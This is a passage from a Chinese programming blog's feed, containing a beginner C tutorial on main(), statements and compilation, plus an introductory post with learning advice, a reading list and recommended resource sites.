id="主函数main">主函数main()</h3><p>无规矩不成方圆，一个C程序必须有管事的老大，我们的代码都从main()函数开始(也就是主函数)，无论执行什么函数，都必须从main()中开始调用或者由其他函数进行进一步的调用.</p><p><code>int main()</code>叫做main函数的<code>函数头</code>，它包含了这个函数的基本信息—函数的名称、需要传递的参数和函数的返回值类型。c语言的函数和数学意义上的函数完全等价，例如f(x)=x+1，其中x为整数. 这个函数就可以写为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123; </span><br><span class="line"><span class="comment">// int 代表x为整型变量(保存整数)，第一个int代表这个函数返回值(可以理解为f(x))为整型;</span></span><br><span class="line"><span class="comment">// 第二个 int 代表这个函数的参数(即x)为整型</span></span><br><span class="line"><span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，函数头后面紧跟的就是函数体，函数体里包含了这个函数的一切操作，函数体以{}作为边界.</p><h3 id="函数内的语句">函数内的语句</h3><p>一个函数中包含的所有内容就是这个函数要执行的运算，还有一些辅助的/必要的数据(局部变量或函数参数)，每一个操作叫做一条语句，语句必须由一个;来结束，一个语句可复杂可简单，一条语句由若干个表达式构成，表达式越多，越复杂冗长，这条语句就越复杂。所以，如果可以，尽可能把一个复杂的操作分成几条语句（几步分开的操作）来运算。</p><p>例如<code>printf(&quot;Hello，World!\n&quot;);</code>这条语句就是执行了一个输出字符串的操作，其中只包含了一个表达式—函数调用表达式—调用了printf()这个函数.</p><p><strong>注意:很多入门教程都不会提到&quot;函数调用表达式&quot;这个概念，请注意没有&quot;函数调用语句&quot;这个东西!</strong></p><p><strong>C语言的大部分语句是由表达式构成的!</strong></p><p>再例如<code>return 0;</code>这条语句就是执行了一个函数返回的操作，任何函数，一旦执行到return语句，即意味着这个函数的执行立即结束，后面的代码无论多少都不会再继续执行，直接返回.return后面跟着的那个值也是一个表达式，可以放置任意和函数类型符合的，可以求值的表达式，此处main函数默认返回一个0，0就是一个值为0的常量表达式.</p><h3 id="总结">总结</h3><p>我们可以发现，一般情况下，一个完整c程序必须或应该包含以下几个部分:</p><ol><li>使用<code>#include&lt;&gt;</code>命令进行头文件的包含，不同的头文件内包含了我们这个程序可能用到的各种函数等的信息</li></ol><p>例如我们用于输出的<code>printf()</code>函数就在stdio.h这个头文件内</p><ol start="2"><li>一个必须存在的函数，他是一切的开始—int main()函数</li></ol><p>一个最规范正确(没有参数时)的main函数的格式应该是这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123; <span class="comment">// 代表main函数的返回值为int类型，同时没有任何参数</span></span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们最多可以把那个括号中的void省略，因为main中的void是在新标准中推荐添加的，我们基于C99版本进行学习即可.</p><p>你还可能看到这样的写法，我们暂时用不到，但他们是没有问题的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这样的:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> *envp[])</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//或者是这样的:</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> **envp)</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//甚至是这样的:</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[],<span class="type">char</span> *envp[])</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这3种都没有问题,但是我们暂时用不到,特别是第3种.</p><p>另外，一切教导你这样写main函数的教材或书，请你扔掉它:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main()&#123;</span><br><span class="line"><span class="comment">//main前面没有int</span></span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="comment">//没有return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>其他过程，也就是其他的辅助函数，用于将功能独立出来</p></li><li><p>一些注释，用于标注这个程序是用来干什么的，或者某一段代码是干什么的</p></li></ol><p>注意:一定要养成写注释的习惯，特别是程序越发复杂，更应该编写注释来以备日后回看，方便改进和维护.</p><h3 id="警惕-烂书-教你的错误写法">警惕&quot;烂书&quot;教你的错误写法</h3><p>之所以让你&quot;扔书&quot;，是想让你知道什么是该学的规范写法，什么是业余的写法:</p><ol><li><p>只有旧标准才允许main前不加返回类型(也就是那个int).</p></li><li><p>此外，如果你发现有这么写的<code>void main()</code>，请毫不犹豫地把这本书扔掉，因为不加返回类型勉强可以说是对的，只不过是旧写法，但是唯独<code>void main()</code>，从来没有任何标准中写过这种写法是正确的。现在(2023年)的各种主流编译器基本都已经不在支持这种写法：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183653567.png" alt="image-20230924183653567"><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183730275.png" alt="image-20230924183730275" style="zoom:33%;" /><br>从这两张图可以看出至少<code>main()</code>没有报错。实际上，<code>main()</code>的写法没有报错是为了对老程序的兼容性—毕竟前面所述，这是一种旧的写法，而不是完全错误的写法。我们学习，就要写<code>int main()</code>，或者 <code>int main(void)</code>更加标准。</p></li></ol><p>注：事实上这里仍然没有提到更加细节的内容，实际上<code>int main(void)</code>才是标准的写法，这是由于C语言中，参数列表为空的函数声明，实际上指代的是这个函数可以接受任意个数的参数（注意并非可变参数）。</p><h2 id="c代码是如何成为计算机程序的">C代码是如何成为计算机程序的</h2><p>学习C语言,或者说学习编程,就是和计算机打交道,多少要了解一些计算机的原理,否则,你学的C语言永远是花架子,找不到精髓.</p><p>一个计算机程序=算法+数据结构,同时他们也有交叉,一个完备的算法应该考虑到对应的数据结构;一种特定的数据结构应该为一个或一系列算法服务.</p><p>C代码,说到底还是一个文本文档,他只是记录了一个程序的逻辑,并不是一个可用的程序,那么作为一种编译型语言,想要把C源文件转换为可执行程序,就需要使用到专门的工具—C编译器(一切编译型语言都有自己的编译器,例如RUST有RUST自己的编译器),我们最常见的就是3种:GCC编译器,MSVC编译器,Clang编译器,我个人使用GCC来进行c代码的编译,他们大同小异,初学阶段无需考虑其差异,任何IDE都有对应的编译器可供使用.</p><p>这里的C源文件就是例如hello.c这样的以.c为后缀的文本文档,实际上它和.txt没有任何区别.他并不是二进制的文件.C编译器做的工作就是&quot;编译&quot;,同时这个&quot;编译&quot;实际上包含了许多操作:“预处理”-&gt;“编译”-&gt;“汇编”-&gt;“链接”,最终链接完成后才是最终的可执行文件,这里的知识点暂时没什么用,可以自行了解.你只需知道,源文件经过编译后才能成为真正的二进制程序用于运行.</p><p>一旦成为计算机程序,就和语言无关了,因为二进制程序是和系统架构严格相关的,RUST编译出来的程序,C++编译出来的程序,C编译出来的程序,都是给同一个系统使用的,也就是说,不管内部细节的话,某种程度上他们已经是和语言无关了.</p><h2 id="我们学了c语言是要干什么">我们学了C语言是要干什么</h2><p>了解了C语言的过程,我们作为C这门技术的使用者,我们的职责就是:</p><p><code>设计算法(或者由其他人设计好,例如数学家等)</code>-&gt;<code>构思程序</code>-&gt;<code>使用C语言进行程序的编写</code>-&gt;<code>进行调试测试</code>-&gt;<code>确认无误后生成正式的程序</code>-&gt;<code>将程序用于实际的生产作业来发挥作用</code>-&gt;<code>维护并改进</code>.</p><p>最关键的就是程序编写和调试测试.</p><br><p align=right>---WAHAHA，2023.9.19</p><br><br><p>上一篇:<a href="../20232e85aaf67188/">写在前面</a></p><p>下一篇:<a href="../20234deceb66e98f/">C语言教程-1_2-关键概念</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程---写在前面</title>
      <link href="/2023253f5327b033/"/>
      <url>/2023253f5327b033/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么开始写这个教程">为什么开始写这个教程</h1><p>在写这篇文章的时候，我还是一名本科学生，早些时候因为中考信息技术考试接触了<code>VB</code>语言，但是并没有对该语言产生多大好感，后来了解到<code>C</code>语言（由一位同学邻居启蒙，真得感谢他，而且人生中第一台电脑就是从他那里花200淘来的老古董）才真正接触了编程。C语言是我最早接触的一门语言（VB：6），也是让我体会颇深的一门语言。尽管在后面看来可能都是计算机er应该有的素质，但是C语言对我个人来说有着重要意义。</p><p>尽管我个人很喜欢C语言，但毕竟C是一门很老的语言（现在是2023年），现如今有着很多新兴语言出现，未来这门语言的形势也未曾可知，但是作为一门我的启蒙语言，我受其影响颇深，我想把我对这门语言的看法记录下来，融入我的这篇教程（<s>随笔</s>），以后再回头也能回忆起当时这门语言对我的影响之深。</p><p>本教程主要面向C初学者（特别是想要认真学习C语言的朋友）、上网闲逛的C爱好者。如果各位想找到<code>浅显快速</code>的入门教程，那么也许例如<a href="https://www.runoob.com/cprogramming/c-tutorial.html">C 语言教程 | 菜鸟教程</a>这样简明的教程更适合您，如果您有充足的时间和兴趣，又没有精力去认真读一些C语言的书,那么这个文章也许能帮助您对C有进一步的认识。</p><p>学习编程，不仅要成为一个好的“写者”，也要成为一个好的“读者”。对于C语言的理解、对于程序设计思想的认识更为重要，要从程序的目的出发，去思考代码应该是什么样的（或者说也许会被写成什么样子）。</p><p>那么我现在就想从一个摸爬滚打的计算机fw的角度来把自己的一点想法记录下来，所以也许这篇教程更像是自己的一个笔记/记录，如果有幸被各位看到，有不认同的地方<code>还请谅解，欢迎讨论</code>。从现在开始，这篇教程就开始编写，无所谓被多少人看到（能看到最好—谁不想自己的努力被人认可呢doge），能写多少也未知晓，虽然会花费很多时间，但是愿意做这个记录，日后回看也是好事，但愿能多写一点。</p><p>另外，本教程目前在个人博客中连载，暂未有像样的目录，因此需要在分类中查看：<a href="https://gngtwhh.github.io/categories/C%E8%AF%AD%E8%A8%80%E6%95%99%E7%A8%8B/">分类: C语言教程 | WAHAHA’s blog</a>。请到我的博客的目录栏目中逐个点击阅读，或者在每篇文章的末尾，都有前后文章的跳转链接。</p><p>​在文章中，有一部分内容碍于篇幅和本人的能力，暂时没有办法完全详细的写在其中，读者可以自行查阅资料，这也算是学习的一个环节。</p><p align=right>——WAHAHA 2023.9.19编写（2024.5.4修改）</p><h1 id="学习c语言应该保持怎样的态度">学习C语言应该保持怎样的态度</h1><p>（写完发现怎么写成“如何学习”教程了。。。）</p><h2 id="对c语言应该保持怎样的-学习-态度">对C语言应该保持怎样的(学习)态度</h2><p>虽然但是，我相信大部分学C语言的人都是被迫的，无论是因为学校的课程，亦或是需求所迫。目前在我看来，90%学C语言的学生日后工作都不会再使用这门语言。无论是RUST，golang等新语言，其他新技术的出现，还有C语言自身的不可否认的一些缺陷，都让C语言这个老古董逐渐退出舞台。本教程适合给对C有探索兴趣的人看。</p><p>但是其实，C语言目前还是不可或缺的（2023年），很多人都会说，我也同样要说，目前在我看来，最接近底层，最容易理解的语言，还要属C语言，C仅次于汇编的简单粗暴让C在速度，自由度上有着极大的优势，同时这也是为什么C被称为中级语言的原因。而且这些特点也和C的发展历史、开发初衷不可分割。具体可以去看《C和指针》、《C专家编程》等书。</p><p>同时由于C语言的这些特性，也让他在当今显得不再合适，更高效率的开发模式依赖新技术，我个人支持，不过C语言我仍然放不下。虽然所谓的“C语言用来系统开发”，“C语言用来写底层非常高效”这些说法确实是C的强项，Linux，UNIX等系统，一些重要程序也都是纯C编写的，但是现在的开发讲求效率，便于维护，C语言就显得比较老旧。</p><p>但是无论C的形势如何，适合用C的地方，其他语言真的是不可替代的。想要应付考试，也可以移步其他教程更为快速有效，毕竟本人还是想好好的把自己的心得记录下来，<strong>而不是简单的应付考试</strong>。</p><h2 id="如何成为一个合格的学习者">如何成为一个合格的学习者</h2><p>废话一大堆，我认为学一门语言最重要的一点就是“<code>认清你的目标</code>”，你的目标决定了你的学习方法，深入学习和快速上手是不一样的，如果您确实对C有着很大的好感，例如作为兴趣，那么欢迎来看我的文章，并欢迎讨论。如果您需要快速上手，那么也许菜鸟教程，或者一些视频课程应该更适合您。</p><p>同时还要“<strong>自觉主动</strong>”，学习是自己的事情，特别是认真学习C语言更是你的选择，不要想着别人应该有义务去教你，有不懂的地方，自觉查资料，自己去弄懂，C语言是一门技能，而不是一门课程，按照学一门课程的思维去学习C语言是掌握不了这门技能的。</p><p>学习不可避免要提问，“<code>提问的艺术</code>”是必须掌握的，无论你学什么，你都应该先认真掌握提问的艺术！！！</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/3cfd9b4a0f10ffb73edd760db6f89b24.jpg" alt="3cfd9b4a0f10ffb73edd760db6f89b24" style="zoom:50%;" /><p>具体请移步↓</p><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">How-To-Ask-Questions-The-Smart-Way</a></p><p>或者请看摘要：<a href="https://gngtwhh.github.io/2023-12-21-31a9f2f41c52/">提问的艺术-简洁版 | WAHAHA’s blog</a></p><p>“提问的艺术”中，着重要强调的一点是“<strong>保持礼貌</strong>”，别人不是你的学习工具，没有哪怕一丁点的义务去帮助你，所以，无论是面对你的学长/学弟/老师/同学/学习群友/论坛坛友/团队成员，请保持礼貌，友好沟通，这样才能获得帮助。</p><p>接下来要注意的就是，<code>永远不要高估自己的实力</code>，也不要过分相信自己的判断，保持谦虚求实的态度会让你进步的更加迅速。C语言中，有着各种各样的陷阱，不加以认真分析很难发现，造成误解，千万不要想当然，以偏概全，学习与交流的过程中请保持谦虚和认真的态度。</p><p>在遇到莫名其妙的错误的时候，请先自查代码，然后再去考虑可能没有意识到的实现差异、版本问题，最后才是怀疑编译器、操作系统问题—因为编译器往往可比你高明多了！</p><h1 id="技术方面上学习c语言的注意事项">技术方面上学习C语言的注意事项</h1><p>下面是一些常见的问题,读者特别是编程初学者必须注意(除非您能接受在提问时被回答者嘲讽,或者浪费大量时间甚至放弃学习C语言)</p><h2 id="我要买一本什么书来看">我要买一本什么书来看?</h2><p>能看懂书就不要看视频,实在看不懂书再看视频,绝对不要看烂书!</p><p>看书(文档资料)学的绝对比看视频学的精(坚定),当然效率方面各位自行评判,这里本人不想挨骂…</p><p>下面的清单是推荐的各种书(2023年),这些书其实足矣↓</p><h2 id="书籍阅读以及学习路线-清单">书籍阅读以及学习路线(清单)</h2><ol><li><p>学习电脑操作快速入门-B站视频</p><p>你需要学会:</p><ol><li>学会开关机,<code>打开</code>windows的各种自带软件(例如文件管理器,任务管理器)</li><li>学会使用<code>QQ</code>,微信,WPS,OFFICE(能基本的使用就行),<code>浏览器</code>,网易有道词典,火绒</li><li>学会解压文件,打包文件,了解各种常见的文件后缀名都是什么,如何使用</li><li>自己能够<code>独立</code>安装<code>任何</code>市面上<code>常见</code>的软件并<code>规划安装路径</code>(这步没学会请不要开始学习编程)</li><li><code>非必要</code>不要将软件装到C盘</li><li>学会<code>打字</code>,学会用鼠标(这步没学会请不要开始学习编程)</li><li>能用电脑解决的计算机任务(手机也是计算机)就不要用手机解决</li><li>学会截图(这步没学会请不要开始学习编程)</li><li>学会截图</li><li>学会截图</li><li>提问时不要使用手机拍照(开始学习编程后请学会此步,否则请放弃学习编程)</li></ol></li><li><p>C语言简易入门书： 《啊哈！C语言》 (比较清晰易懂，实在小白可以看这本找找感觉)</p></li><li><p>C语言<code>新标准(C11)</code>优质书: 《C语言程序设计-现代方法(第2版,修订版)》 (相对全面介绍新标准,鼓励!)</p></li><li><p>C语言公认&quot;圣经&quot;: 《C Primer Plus（中文第6版）》 (C99标准经典好书,十分全面,新手读起来有点难,适合当工具书)</p></li><li><p>查漏补缺的书: 《你必须知道的495个C语言问题》 (你几乎可以在这里找到你初学C语言遇到的所有问题)</p></li><li><p>C语言进阶3件套(如果你还想继续深入学习<code>C语言</code>的艺术)</p><p>C编程风格与思想：《C专家编程》</p><p>C语言的细枝末节与问题：《C陷阱与缺陷》</p><p>C语言的灵魂-指针：《C和指针》(深入分析C指针的经典好书！)</p></li><li><p>学习数据结构(C语言相对熟练后,可以开始数据结构的学习)</p><p>实践与思想结合，深化思想： 《数据结构与算法分析（C语言描述）原书第2版》 （好书，有能力建议看这本）</p><p>考研用的…与实际脱节…全是理论: 《数据结构（C语言版）严蔚敏著》 （为了考试而生…）</p><p>C++描述的一本书,不建议新手从头到尾看: 《数据结构、算法与应用 C++描述》 (没学C++就算了)</p><p>另外一本C++描述的书，同样不建议新手从头到尾看： 《数据结构与算法分析 C++语言描述》</p><p>看书看不进去？找一个知识清单，直接上网一个知识点一个知识点地找</p></li><li><p>学习算法(从现在开始系统地学习算法)</p><p>简易入门书： 《啊哈！算法》 （蛮简单的，适合入门捏）</p><p>图确实清晰： 《算法图解》 （一本挺薄的书，还可以）</p><p>各种信息学奥赛的教材都可以: 《信息学奥赛一本通》《算法训练营套装》 （别问，问就是卷疯了）</p><p>例题很多：《算法基础与在线实践》 （题可能有点难）</p><p>算法&quot;圣经&quot;: 《算法导论》 （萌新坟场，有人推荐直接看这个，骂就完了）</p></li><li><p>深入底层（如果你仍然喜欢探究原理的话…勇士!)</p><p>手搓CPU指令集(开玩笑)： 《深入理解计算机系统》 （传说中的<code>CSAPP</code>）</p><p>书如其名： 《编译原理》（经典龙书）</p><p>学汇编吧: 《汇编语言（第3版）王爽著》 （8086汇编经典，16位汇编其实相对x86，x64难一点，因为有<code>段</code>的概念）</p><p>操作系统当然要学了：《现代操作系统》（嗯…嗯？嗯！）</p></li><li><p>转向其他语言</p><p>C++: C语言的超集，而超脱于C，该语言异常地复杂（不信邪的来学学），惊人的学习成本，难以学习，慎重考虑，但是功能非常强大，应用领域很广，另外打竞赛也是首选</p><p>Python: 十分方便的一门解释型语言，有大量第三方库，十分好用（学计算机的还是学学吧，学了不亏）</p><p>Java: 很卷…很卷…</p><p>RUST: 新语言，学习曲线不太平缓，目前生态尚不完善，其设计貌似比较适合系统编程，有待观望</p><p>Golang: <s>不知道…</s> 新兴语言，从C发展来的（C系语言），比较容易上手，表现优异，先天为并发编程而生，但是也有着自己的问题，尚未成熟，非常适合web开发</p></li></ol><br>对上面的一些解释:<ol><li><p>上面的列举更多的是<code>清单</code>,而不是<code>路线</code>,书名前是书籍的客观描述(出于个人,不喜勿喷),书名后括号是个人的态度(出于个人,不喜勿喷),各个方向的书中选择适合自己的,可以几本书结合起来,取长补短.</p></li><li><p>学习编程非常注重实操，请熟练使用电脑.</p></li><li><p>各位往往从C语言入门,而不再深入,适时转向其他语言这很正常.不过底层知识作为计算机er还是十分重要的.</p></li><li><p>算法这一概念十分广泛,小到<code>最大公因数求解</code>,大到<code>机器学习</code>,有着十分广泛的分支.学习<code>数据结构</code>的时候往往逃脱不开对应的<code>算法</code>,换言之,算法和数据结构密不可分,包括实际的代码实现,请不要将其视为三个不相干的板块.</p></li><li><p><code>注意:</code> 大名鼎鼎的&quot;谭浩强C语言&quot;(红书),对书不对人,谭老的这本书虽然经典,但是放在现在(2023年)有点过时了,而且这本书的习题集<code>真的别做</code>,很多都是错误的.不过这本书的第五版更新了,感觉还可以.</p></li><li><p>看一些听都没听过的书时最好小心!书名常常为《XX语言程序设计》等.书中有问题你就被坑惨了.</p></li><li><p>不要轻信书中的内容,任何资料都难免有谬误,自己上手试验思考.</p></li></ol><h2 id="我的代码为什么跑不通了-软件问题">我的代码为什么跑不通了?软件问题?</h2><p>作为C语言的学习者，你不可避免的会遇到很多看似正确，实则错误的写法，这也许怪不得你，因为<code>C语言如此精简</code>使得很多不经意的修改并不会导致语法上的错误，甚至在逻辑结果上在小范围内都不会有任何问题。所以，如果你发现你的程序换一个输入或者做了一个小修改，结果就不对了，请<code>首先不要质疑你的编译器/IDE/操作系统等等---他们一般情况下比你高明多了，先去考虑自己的代码哪里有问题</code>。</p><h2 id="我的软件怎么配置不好">我的软件怎么配置不好?</h2><p>初学，不要纠结任何软件问题，不要去考验自己，我个人是<code>不建议</code>初学者去使用VSCode等需要高度自定义的软件的，一句话：“先让程序跑起来，能跑就行”.后面会有专门的篇章进行讲解软件的选择和安装.</p><h2 id="好多重点-我要不要记笔记">好多重点,我要不要记笔记?</h2><p>学习C语言过程中，个人建议少做笔记，特别是不要动笔，因为这样效率太低了！</p><p>取而代之的是，请做一些总结性的东西，而不是将各个知识点“复制”一份。总结性的东西一般以博客文章的形式呈现，作为学习成果的总结。有能力搭建一个个人博客，将文章挂载到上面。</p><p>请学习一点知识，打开你的编辑器，写一个特定功能的程序，<code>把你的笔记作为这个程序的注释放进去</code>，<code>存好这个程序</code>，这才是实打实的东西！！！</p><p>当然，如果您想要做博客总结，当然十分好，例如使用<code>Hexo</code>框架搭建个人博客，并使用<code>Typora</code>来编辑博客文章。</p><h2 id="没电脑-其他设备可以用吗">没电脑,其他设备可以用吗?</h2><p>可以,如果你实在没电脑的话,用手机平板都是可以的,这时候就别想着这些平台的编译器能有多好用,能跑就行.</p><p>有条件的话还是要配一台电脑的,现在（2024年）四五千随随便便一台电脑就足以进行编程的学习。</p><h1 id="学习技巧">学习技巧</h1><h2 id="我需要从哪里寻找资料">我需要从哪里寻找资料?</h2><h3 id="使用搜索引擎">使用搜索引擎</h3><p>首先,利用好<code>搜索引擎</code>,这里的搜索引擎主要是<code>Bing,google</code>这两个,所谓的<code>中文必应,英文谷歌</code>,在这里不建议用百度.</p><p>别问,问就是学计算机的没人用百度去搜索,什么都搜不到…</p><p>我们来尝试搜索一下<code>ebp寄存器</code>来做个对比:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004405786.png" alt="image-20230930004405786" style="zoom: 30%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004427966.png" alt="image-20230930004427966" style="zoom:30%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230930004450210.png" alt="image-20230930004450210" style="zoom:30%;" /><p>我们来看一下前几条结果…</p><ol><li><p>百度给了个百度百科,给了一篇csdn博客,然后就是b站视频…</p></li><li><p>必应给一篇文章突出显示,然后后面全是相关文章…</p></li><li><p>谷歌搜索出来的全是相关文章…</p></li></ol><p>很显然…百度搜出来的都是什么玩意…所以,<code>我们一定要学会用必应或者谷歌去查找资料!</code></p><p>而且,如果你在中文网站找不到满意的资料,不<code>妨试试看国外的文章</code>,相信你很有可能会找到满意的答案!</p><h3 id="利用好一些网站">利用好一些网站</h3><p>学习C语言,我还真没有用过什么网站,这里想说的就是,如果你找到了一些比较好的网站,请多去翻翻看,也许就能找到答案.</p><p>而且,有一些公认的程序员必备网站,我们应该多加利用:</p><h4 id="1-github">1.GitHub</h4><p>开发者极其重要的网站：<a href="https://link.zhihu.com/?target=https%3A//github.com/">https://github.com</a></p><p>这个网站上面有大量的资源,许多开发者都将自己的代码托管在上面,我们可以在上面找到不计其数的工具,项目等,只有你想不到,没有他没有的东西.</p><p>同时,这个网站不仅仅是C语言,只要你从事计算机行业,这个网站你绝对逃不掉!而且,许多学生认证也看的是这个平台!</p><h4 id="2-b站">2.B站</h4><p>国内的许多好视频教程都在这上面有发布,许多免费课都有,如果你需要短时间了解一门技术,不妨来B站试试看.</p><h4 id="3-stack-overflow">3.<strong>Stack Overflow</strong></h4><p><strong>Stack Overflow — 解决 bug 的社区：<a href="https://link.zhihu.com/?target=https%3A//stackoverflow.com/">https://stackoverflow.com/</a></strong></p><p>这是一个非常专业的交流平台,不同于博客网站,上面的大量问题都是有着非常专业的回答,如果有能力,一定要多在这上面寻求帮助.</p><h4 id="4-csdn">4.csdn</h4><p>说实话…这个网站现在有点废…因为任何人随便发几句随笔,就能当做博客丢上去了,就导致csdn上面的信息良莠不齐,如果是临时查找一些简单的知识,可以来csdn找找,更专业的知识…最好去<code>博客园</code>等网站看看.</p><p>而且好多都收费…没钱…</p><h4 id="5-cppreference">5.cppreference</h4><p>中文网站:<a href="https://zh.cppreference.com/mwiki/index.php?title=%E9%A6%96%E9%A1%B5&amp;variant=zh-cn">https://zh.cppreference.com/mwiki/index.php?title=首页&amp;variant=zh-cn</a></p><p>这可是<code>标准文档</code>啊!标准文档!这上面是非常权威的解释!</p><p>如果你在和某人讨论一些语法概念的细节,不如直接拿标准说话!</p><p><code>&quot;你说的听起来没毛病,但是标准是这么说的吗?如果不是,那你就是错的!&quot;</code></p><p>并没有什么所谓&quot;不要挑战权威&quot;的意思,我们是学习编程,学的是别人创造出来的技术,不是你在开发技术,有什么疑问,那么这么语言的开发维护者有绝对的话语权!</p><h4 id="6-微软msdn">6.微软MSDN</h4><p>也许你在学习VS怎么使用,或者你在学习Win32API,请查询微软官方的在线文档.</p><p><a href="https://learn.microsoft.com/zh-cn/docs/">https://learn.microsoft.com/zh-cn/docs/</a></p><h3 id="多听建议">多听建议</h3><p>相信大部分人都有厉害的学长学姐(还有同辈,学弟学妹)…多去问问他们…你会有收获的doge</p><h2 id="也许我需要一些前置知识">也许我需要一些前置知识?</h2><h4 id="学会使用电脑">学会使用电脑</h4><p>(参见前面的<code>书籍清单以及...</code>)</p><p>虽然这个标题听起来有点搞笑,但是事实就是如此—不是每个开始学C语言的人都能流畅的使用电脑(包括各种技巧).</p><p>但是,我必须指出的是,如果你能轻松的使用电脑,甚至多少了解一些计算机(电脑)的基本原理,那么你学习C语言入门会轻松的起飞!</p><p>因为,<code>学习编程,某种程度上就是在学习如何从计算机的角度去考虑如何解决一个问题</code>!</p><p>各位如果确实欠缺这方面的知识(例如从来没用过电脑),可以去买一本大学计算机基础的书,简单补一下知识…</p><p>或者,至少你应该知道如何在Windows操作系统下正常安装各种软件,使用QQ进行聊天,学会使用电脑的截图,记住常用的Windows快捷键等等,如何使用电脑浏览器去搜索资源并下载…</p><h4 id="基础数学">基础数学</h4><p>1+1=2是不够的…</p><p>虽然不要求你在学C之前必须掌握如何求解一元二次方程…但是我们学习C语言的一个最简单的用途就是求解数学方程…那么你如果连方程是什么都不知道…那么…你懂…</p><p>想要学好C语言,至少要有高中的数学知识—不会就学,有些地方的初中比一些高中还nb…不要求你能流畅做出高考导数题,起码要知道导数是啥.</p><p>绝对值,开方,三角函数这些要知道吧…都是基础.</p><p>另外,像<code>素数判断,最大公因数,最小公倍数的求法</code>等最基本的数学算法,你也应该掌握—至少掌握一种求法.</p><p>如果这些没问题了,我们C语言用来解决数学问题的时候,当然需要你知道这些数学问题,比如基本的线性代数,我们要写一个矩阵求逆的算法,你需要知道矩阵是什么,如何求逆.</p><p>等等…</p><p>当然,并不是说学了C语言就一定要去编写这些东西,但是有一点能保证的是,有实力的程序员对这些都是非常熟练的.总之,数学知识可以不够,但是至少你的数学思维多少要到位!</p><h4 id="学英语">学英语</h4><p>这个没的说,许多网站都是英文的,虽然我们有翻译软件,但是毕竟翻译出来的专业名词和原文还是有差异的,最好要差不多能读懂一些英文的文章.</p><p>但是,学编程和英语真的没啥关系…尽管我们使用英文字符去编码…你看到的代码中那一堆所谓的&quot;英文&quot;,其实大部分都是起的变量名而已,找个词典一查,复制粘贴出来就行…</p><h2 id="写代码的时候">写代码的时候</h2><p>不要手写！</p><p>敲代码-&gt;可以调试,手写代码-&gt;肉眼生盯</p><p>注意代码格式规范,养成较好的代码规范更有助于理解代码.</p><p>写注释!如果一段代码比较复杂/比较重要,请写注释!</p><br><p>别的需要的我暂时想不到了…想到了再补充…</p><h1 id="约定和注意事项">约定和注意事项</h1><h2 id="本教程的问题">本教程的问题</h2><p>本教程的问题很明显,前后可能不太连贯,很多知识会&quot;放到后面讲&quot;,出现这个问题的原因是笔者想将各个概念讲好,而不是一带而过.</p><p>另外,教程可能不会包含一些非常简单的，在书上就能找到的东西—例如一些基本的计算机常识—你应该同时找一本书作为参考或者多去搜索！</p><h2 